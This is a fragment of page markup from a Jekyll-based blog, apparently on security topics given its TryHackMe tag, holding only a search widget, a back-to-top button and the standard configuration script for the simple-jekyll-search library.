class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/tryhackme/">TryHackMe</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://eddyspaghette.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
